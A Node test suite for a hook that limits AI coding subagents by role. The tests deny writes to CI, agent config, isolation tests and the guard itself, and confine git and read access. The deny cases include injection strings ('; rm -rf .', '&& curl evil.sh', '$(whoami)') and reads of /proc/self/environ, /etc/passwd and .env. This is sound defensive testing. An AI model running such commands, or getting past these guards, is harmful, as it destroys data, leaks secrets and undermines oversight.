// Run with: node --test scripts/role-guard.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, mkdtempSync, mkdirSync, writeFileSync, symlinkSync, realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { decide, makeGuardHook, repoRelative, isReadOnlyGit, stagingViolation } from "./role-guard.mjs";

// A real directory: the read-scope check resolves symlinks on disk (path-scope.mjs), and a root that
// does not exist fails closed.
const ROOT = realpathSync(mkdtempSync(join(tmpdir(), "guard-")));
mkdirSync(join(ROOT, "clyintel/lib"), { recursive: true });
mkdirSync(join(ROOT, ".git"));
writeFileSync(join(ROOT, "clyintel/lib/a.ts"), "");
symlinkSync("/proc/self/environ", join(ROOT, "clyintel/lib/env"));
const denied = (r) => r?.hookSpecificOutput?.permissionDecision === "deny";
const call = (tool_name, tool_input, who = {}) =>
  decide({ hook_event_name: "PreToolUse", tool_name, tool_input, ...who }, ROOT);
const as = (agent_type) => ({ agent_id: "a1", agent_type });

test("main thread may only delegate/read", () => {
  assert.ok(!denied(call("Read", { file_path: "x" })));
  assert.ok(!denied(call("Agent", { subagent_type: "planner" })));
  assert.ok(!denied(call("Task", { subagent_type: "reviewer" })));
  for (const t of ["Bash", "Write", "Edit", "Grep", "WebSearch"]) assert.ok(denied(call(t, {})), t);
});

test("main thread cannot spawn a built-in agent type", () => {
  assert.ok(denied(call("Agent", { subagent_type: "general-purpose" })));
  assert.ok(denied(call("Agent", {})));
});

test("unknown subagent types are denied", () => {
  assert.ok(denied(call("Read", {}, as("general-purpose"))));
});

test("planner can read/search and write ONLY .factory/plan.md", () => {
  assert.ok(!denied(call("WebSearch", {}, as("planner"))));
  assert.ok(!denied(call("Write", { file_path: ".factory/plan.md" }, as("planner"))));
  assert.ok(!denied(call("Write", { file_path: `${ROOT}/.factory/plan.md` }, as("planner"))));
  for (const f of [
    "clyintel/app/page.tsx",
    ".factory/test-report.md",
    ".factory/runs/log.jsonl",
    ".factory/plan.md/../runs/log.jsonl",
    ".github/workflows/ci.yml",
    "../plan.md",
    "",
  ])
    assert.ok(denied(call("Write", { file_path: f }, as("planner"))), f);
  for (const t of ["Bash", "Edit"]) assert.ok(denied(call(t, {}, as("planner"))), t);
});

test("coder can write app code and run shell", () => {
  for (const t of ["Write", "Edit", "Bash", "Read"]) assert.ok(!denied(call(t, { file_path: "a.ts" }, as("coder"))), t);
  for (const f of ["clyintel/app/page.tsx", "clyintel/lib/charge.ts", ".factory/build-notes.md", `${ROOT}/clyintel/x.ts`])
    for (const t of ["Write", "Edit"]) assert.ok(!denied(call(t, { file_path: f }, as("coder"))), `${t} ${f}`);
  assert.ok(denied(call("WebSearch", {}, as("coder"))));
});

test("coder cannot Write/Edit factory, CI or git files", () => {
  for (const f of [
    ".claude/settings.json", ".claude/agents/reviewer.md", ".github/workflows/ci.yml",
    "scripts/role-guard.mjs", "scripts/d3-orchestrator.mjs", ".git/config", ".git/hooks/pre-push",
    ".gitignore", ".factory/runs/log.jsonl", `${ROOT}/.github/workflows/x.yml`,
    "clyintel/../.claude/settings.json", // traversal into a protected dir
    "/etc/passwd", "../outside.ts",
  ])
    for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: f }, as("coder"))), `${t} ${f}`);
  // lookalikes are fine
  for (const f of ["clyintel/scripts/seed.ts", "clyintel/.github-notes.md", "clyintel/lib/scripts.ts"])
    assert.ok(!denied(call("Write", { file_path: f }, as("coder"))), f);
  // build/deploy surface: vercel.json (crons), next.config.*, schema/
  for (const f of ["vercel.json", "clyintel/vercel.json", "clyintel/vercel.ts", ".vercelignore", "clyintel/next.config.ts", "next.config.mjs", "clyintel/schema/001.sql", "schema/002.sql"])
    for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: f }, as("coder"))), `${t} ${f}`);
  // parity with the publish job's list: refuse up front instead of wasting a paid run
  for (const f of ["api/slack-command.js", ".gitattributes", "clyintel/.gitattributes", "CLAUDE.md", "clyintel/CLAUDE.md", "clyintel/lib/CLAUDE.local.md", "clyintel/.claude/settings.json", "clyintel/lib/config/env-config.test.ts", "clyintel/test/stubs/server-only.ts"])
    for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: f }, as("coder"))), `${t} ${f}`);
  // product context the agents are steered by (.ai/) and MCP server config
  for (const f of [".ai/constitution.md", "clyintel/.ai/specs/x.md", ".mcp.json", "clyintel/.mcp.json"])
    for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: f }, as("coder"))), `${t} ${f}`);
  // ...but ordinary dependency and app changes stay allowed (a feature may add a package)
  for (const f of ["clyintel/package.json", "clyintel/package-lock.json", "clyintel/app/schema-view.tsx", "clyintel/lib/schemaUtil.ts", "clyintel/lib/vercel-helper.ts"])
    assert.ok(!denied(call("Write", { file_path: f }, as("coder"))), f);
  // the tenant-isolation test guards against one customer seeing another's data
  for (const f of ["clyintel/tests/tenant-isolation.test.ts", "tests/tenant-isolation.helpers.ts", "clyintel/lib/tenant-isolation.ts"])
    for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: f }, as("coder"))), `${t} ${f}`);
});

test("tester can write test files and its report only", () => {
  const ok = [
    "clyintel/tests/new-feature.test.ts",
    "clyintel/test/helpers/db.ts", // top-level test dir
    "tests/helper.ts",
    "clyintel/lib/settlement/charge.spec.tsx", // test filename anywhere
    "clyintel/app/__tests__/page.test.tsx",
    ".factory/test-report.md",
    `${ROOT}/clyintel/tests/a.test.ts`,
  ];
  const bad = [
    "clyintel/app/api/test/route.ts", // live Next.js route in a dir named "test"
    "clyintel/lib/tests/whatever.ts", // importable module in a nested "tests" dir
    "clyintel/app/__tests__/page.tsx", // not a test filename
    "clyintel/lib/settlement/charge.ts",
    "clyintel/app/page.tsx",
    "clyintel/tests/../lib/charge.ts", // traversal out of tests/
    "../outside/a.test.ts", // escapes repo
    "/etc/passwd",
    ".github/workflows/ci.yml",
    ".factory/plan.md", // tester must not rewrite the plan
    ".factory/runs/log.jsonl", // ...or forge the run log
    "clyintel/lib/outreach/agent-isolation.test.ts", // second cross-tenant isolation test
    "clyintel/lib/config/env-config.test.ts", // guards server secrets / live-charge gating
    "clyintel/test/stubs/server-only.ts", // aliased into every suite
    "clyintel/tests/tenant-isolation.test.ts", // the multi-tenant isolation test must not be weakened
    "clyintel/tests/tenant-isolation.helpers.ts",
    "clyintel/latest/foo.ts", // "latest/" must not match "test"
    "clyintel/contest/foo.ts",
    "",
  ];
  for (const f of ok) for (const t of ["Write", "Edit"]) assert.ok(!denied(call(t, { file_path: f }, as("tester"))), `${t} ${f}`);
  for (const f of bad) for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: f }, as("tester"))), `${t} ${f}`);
  assert.ok(!denied(call("Bash", { command: "npx vitest run" }, as("tester"))));
});

const G = "git --no-pager -c core.fsmonitor=false -c log.showSignature=false";
const SAFE = "--no-ext-diff --no-textconv";

test("reviewer: no Write/Edit", () => {
  for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: ".factory/x.md" }, as("reviewer"))), t);
});

test("reviewer Bash: canonical read-only git is allowed", () => {
  for (const c of [
    `${G} diff ${SAFE} main...HEAD --`,
    `${G} diff ${SAFE} --stat main...HEAD -- clyintel/app/page.tsx`,
    `${G} log ${SAFE} --oneline -n5`,
    `${G} log ${SAFE} --oneline -n 5 main..HEAD`,
    `${G} show ${SAFE} HEAD -- clyintel/lib/charge.ts`,
    `${G} diff ${SAFE} --cached`,
    `${G} diff ${SAFE} --staged --stat`,
    `${G} diff ${SAFE} a..b --`,
    `${G} rev-parse HEAD`,
    `${G} merge-base main HEAD`,
    `${G} ls-files`,
    `${G} rev-list --count main..HEAD`,
  ])
    assert.ok(!denied(call("Bash", { command: c }, as("reviewer"))), c);
});

test("reviewer Bash: everything else is denied", () => {
  for (const c of [
    // writes / mutations / other commands
    "git push origin main",
    "git commit -am x",
    "cat .env",
    "npm test",
    "",
    // no canonical prefix
    "git diff main...HEAD",
    "git status",
    // anything comparing the WORKTREE can run planted clean filters
    `${G} status --short`,
    `${G} status`,
    `${G} diff ${SAFE}`,
    `${G} diff ${SAFE} --stat`,
    `${G} diff ${SAFE} HEAD`,
    `${G} diff ${SAFE} main`,
    `${G} diff ${SAFE} -- a..b`, // ".." only counts before --
    // a range with no explicit "--": git may read it as a FILE named like that (a committed
    // file called "a..b" + a clean filter makes this a working-tree diff)
    `${G} diff ${SAFE} HEAD a..b`,
    `${G} diff ${SAFE} main...HEAD`,
    `${G} diff ${SAFE} a..b`,
    `${G} diff ${SAFE} --stat main...HEAD`,
    `git -c core.fsmonitor=false diff ${SAFE} main`, // missing --no-pager / showSignature
    // diff/log/show without the driver-disabling flags
    `${G} diff main...HEAD`,
    `${G} diff --no-ext-diff main...HEAD`,
    `${G} show --no-textconv HEAD`,
    // abbreviated / unlisted long options (git accepts unambiguous prefixes)
    `${G} diff ${SAFE} --outp=/tmp/x`,
    `${G} diff ${SAFE} --output=/tmp/x`,
    `${G} diff ${SAFE} --ext-d`,
    `${G} diff ${SAFE} --textc`,
    `${G} log ${SAFE} --show-signature`,
    `${G} diff ${SAFE} -c core.pager=sh`,
    `${G} diff ${SAFE} --git-dir=/tmp/x`,
    // shell metacharacters / injection
    `${G} diff ${SAFE} main; rm -rf .`,
    `${G} diff ${SAFE} main && curl evil.sh`,
    `${G} log ${SAFE} | sh`,
    `${G} diff ${SAFE} > out.txt`,
    `${G} diff ${SAFE} $(whoami)`,
    `${G} diff ${SAFE} \`id\``,
    `${G} diff ${SAFE}  main`, // double space
    // option smuggled after --
    `${G} diff ${SAFE} -- --output=x`,
    // unlisted subcommand
    `${G} blame ${SAFE} f`,
    `${G} config core.pager sh`,
  ])
    assert.ok(denied(call("Bash", { command: c }, as("reviewer"))), c);
});

test("repoRelative / isReadOnlyGit edge cases", () => {
  assert.equal(repoRelative("a/./b//c", ROOT), "a/b/c");
  assert.equal(repoRelative("a/../../x", ROOT), null);
  assert.equal(repoRelative(`${ROOT}-evil/x`, ROOT), null);
  assert.equal(isReadOnlyGit(undefined), false);
});

test("hook fails closed and reports calls", async () => {
  let n = 0;
  const hook = makeGuardHook(ROOT, () => n++);
  assert.ok(denied(await hook({ tool_name: "Bash", tool_input: {} })));
  assert.equal(n, 1);
  // malformed input (tool_input null) must deny, not throw
  assert.ok(denied(await hook({ tool_name: "Write", tool_input: null, agent_id: "a", agent_type: "tester" })));
});

test("coder protections cover everything the publish job refuses (kept in sync)", () => {
  const wf = readFileSync(join(dirname(fileURLToPath(import.meta.url)), "../.github/workflows/d3-factory.yml"), "utf8");
  const PROTECTED = new RegExp(wf.match(/PROTECTED='([^']+)'/)[1], "i"); // publish greps with -i
  const samples = [
    ".claude/agents/x.md", ".github/workflows/x.yml", "scripts/x.mjs", "api/x.js", ".gitignore", ".gitattributes",
    "clyintel/.gitattributes", "CLAUDE.md", "clyintel/lib/CLAUDE.md", "CLAUDE.local.md", "clyintel/.claude/settings.json",
    "clyintel/tests/tenant-isolation.test.ts", "clyintel/lib/outreach/agent-isolation.test.ts", "clyintel/lib/x/org-isolation.spec.ts", "clyintel/lib/config/env-config.test.ts", "clyintel/test/stubs/server-only.ts",
    "vercel.json", "clyintel/vercel.json", "clyintel/vercel.ts", "clyintel/.vercelignore", "clyintel/next.config.ts", "schema/1.sql", "clyintel/schema/1.sql",
    ".ai/x.md", "clyintel/.ai/x.md", ".mcp.json", "clyintel/.mcp.json", "clyintel/supabase/migrations/1.sql", ".Claude/settings.json", "Claude.md", ".Mcp.json", ".GitHub/workflows/x.yml", ".gitmodules", "clyintel/supabase/migrations/001.sql", "supabase/config.toml", "clyintel/vitest.config.ts", ".env", ".env.local", "clyintel/.env.production",
  ];
  for (const f of samples) {
    assert.ok(PROTECTED.test(f), `sample not protected by publish: ${f}`);
    assert.ok(denied(call("Write", { file_path: f }, as("coder"))), `publish refuses ${f} but the coder may write it`);
  }
});

test("coder and tester Bash: no force-add and no staging under .factory/ (a prior run committed .factory/plan.md)", () => {
  const bad = [
    "git add -f .factory/plan.md", "git add --force .factory/plan.md", "git add -Af", "git add -fA schema",
    "git add .factory/plan.md", "git add ./.factory/test-report.md", "git add -A .factory", "git -c core.x=y add -f x",
    "git -C . add .factory/", "cd x && git add -f a", "git add a; git add -f b", "git update-index --add .factory/plan.md",
    "git stage .factory/notes.md",
  ];
  for (const role of ["coder", "tester"]) {
    for (const c of bad) assert.ok(denied(call("Bash", { command: c }, as(role))), `${role} may run: ${c}`);
  }
  const ok = [
    "git add clyintel/app/page.tsx", "git add -A", "git add .", "git commit -m 'note about .factory/ files'",
    "git commit -m x", "git status", "npx vitest run", "git diff --stat", "echo force > f.txt", "git add file-with-f.ts",
  ];
  for (const role of ["coder", "tester"]) {
    for (const c of ok) assert.ok(!denied(call("Bash", { command: c }, as(role))), `${role} blocked: ${c}`);
  }
  assert.equal(stagingViolation(undefined), null);
  // planner and the main thread have no Bash at all; the reviewer's Bash is its own allowlist
  assert.ok(denied(call("Bash", { command: "git add -f x" }, as("planner"))));
});

test("hook reports every decision to onDecision, and a throwing logger cannot change the decision", async () => {
  const seen = [];
  const hook = makeGuardHook(ROOT, () => {}, (input, out) => seen.push([input.tool_name, denied(out)]));
  await hook({ tool_name: "Edit", tool_input: { file_path: "schema/README.md" }, agent_id: "a", agent_type: "coder" });
  await hook({ tool_name: "Edit", tool_input: { file_path: "clyintel/app/page.tsx" }, agent_id: "a", agent_type: "coder" });
  assert.deepEqual(seen, [["Edit", true], ["Edit", false]]);
  const thrower = makeGuardHook(ROOT, () => {}, () => { throw new Error("log failed"); });
  assert.ok(denied(await thrower({ tool_name: "Edit", tool_input: { file_path: "schema/README.md" }, agent_id: "a", agent_type: "coder" })));
  assert.ok(!denied(await thrower({ tool_name: "Read", tool_input: { file_path: "x" }, agent_id: "a", agent_type: "coder" })));
});

test("every subagent may hand its result back (SubagentHandback); the main thread and other tools stay restricted", () => {
  for (const role of ["planner", "coder", "tester", "reviewer"]) {
    assert.ok(!denied(call("SubagentHandback", { result: "done" }, as(role))), `${role} cannot hand back its result`);
  }
  // not a loophole: the main thread still may only delegate/read, unknown subagent types are still refused,
  // and an unlisted tool is still denied for every role
  assert.ok(denied(call("SubagentHandback", {})));
  assert.ok(denied(call("SubagentHandback", {}, as("general-purpose"))));
  for (const role of ["planner", "coder", "tester", "reviewer"]) {
    assert.ok(denied(call("WebFetch", { url: "https://example.com" }, as(role))), `${role} may use WebFetch`);
  }
});

test("read scope: planner, reviewer and the top-level session cannot read outside the repo or into .git", () => {
  const outside = [
    ["Read", { file_path: "/proc/self/environ" }],
    ["Read", { file_path: "/proc/1/environ" }],
    ["Read", { file_path: "/etc/passwd" }],
    ["Read", { file_path: "../outside.txt" }],
    ["Read", { file_path: "~/.npmrc" }],
    ["Read", { file_path: ".git/config" }],
    ["Read", { file_path: `${ROOT}/.git/HEAD` }],
    ["Read", { file_path: "clyintel/lib/env" }], // a symlink the coder left behind
    ["Grep", { pattern: "ANTHROPIC", path: "/proc" }],
    ["Grep", { pattern: "x", path: ".git" }],
    ["Grep", { pattern: "x", glob: "/proc/**" }],
    ["Glob", { pattern: "/proc/*/environ" }],
    ["Glob", { pattern: "**/*", path: "/" }],
    ["Glob", { pattern: ".git/**" }],
  ];
  const inside = [
    ["Read", { file_path: "clyintel/lib/a.ts" }],
    ["Read", { file_path: `${ROOT}/clyintel/lib/a.ts` }],
    ["Read", { file_path: ".factory/plan.md" }], // not written yet: judged by its parent
    ["Grep", { pattern: "TODO" }],
    ["Grep", { pattern: "TODO", path: "clyintel", glob: "*.ts" }],
    ["Glob", { pattern: "**/*.ts" }],
  ];
  for (const who of [{}, as("planner"), as("reviewer")]) {
    const role = who.agent_type ?? "main";
    for (const [tool, args] of outside) {
      if (role === "main" && tool !== "Read") continue; // main may not use Grep/Glob at all
      const r = call(tool, args, who);
      assert.ok(denied(r), `${role} ${tool} ${JSON.stringify(args)} was allowed`);
      assert.match(r.hookSpecificOutput.permissionDecisionReason, /outside the repository|inside \.git/);
    }
    for (const [tool, args] of inside) {
      if (role === "main" && tool !== "Read") continue;
      assert.ok(!denied(call(tool, args, who)), `${role} ${tool} ${JSON.stringify(args)} was denied`);
    }
  }
  // main still may not Grep/Glob at all, scoped or not
  assert.ok(denied(call("Grep", { pattern: "x" })));
  assert.ok(denied(call("Glob", { pattern: "*" })));
});

test("read scope: the hook fails closed when the repo root cannot be resolved", () => {
  const r = decide({ tool_name: "Read", tool_input: { file_path: "a.ts" }, agent_id: "a", agent_type: "reviewer" }, "/no/such/repo/root");
  assert.ok(denied(r));
});

test("read scope: coder and tester read tools are not path-scoped (they have Bash; the container is their boundary)", () => {
  for (const role of ["coder", "tester"]) assert.ok(!denied(call("Read", { file_path: "/tmp/vitest-output.txt" }, as(role))), role);
});
